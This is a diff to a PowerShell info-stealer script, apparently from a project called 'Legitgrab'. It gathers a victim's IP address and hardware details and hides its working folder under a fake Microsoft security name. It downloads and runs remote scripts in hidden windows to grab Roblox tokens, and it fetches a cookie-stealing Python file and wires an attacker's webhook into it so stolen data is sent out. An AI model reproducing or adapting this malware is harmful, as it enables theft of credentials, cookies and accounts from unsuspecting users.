@@ -4,12 +4,14 @@ $webHookUrlPYTHON="'"+$webHookUrl+"'"
 $webHookUrlPYTHON2="""$webHookUrl"""
 $webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
 $webHookUrl2="$"+"webHookUrl"
+$Hook = 'hook = ' + $webHookUrl
 ##
 $ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
 $gpu = (Get-WmiObject win32_VideoController).Name
 $cpu = (Get-WmiObject Win32_Processor).Name
 $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
+attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 #####################################################################
 
 
@@ -106,8 +108,12 @@ powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://
 powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_gen.ps1).content)
 #For grab roblox info/tokens
 
-powershell -windowstyle hidden $webHookUrl2=$webHookUrl;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_use.ps1).content)
-#For grab all cookies (thx to https://github.com/Smug246/Luna-Token-Grabber)
+
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
+(Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
+#python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
+#For grab all cookies (no thx lol) and i have a lot of dev
 
 #powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_utils.ps1).content)
 #For idk lol
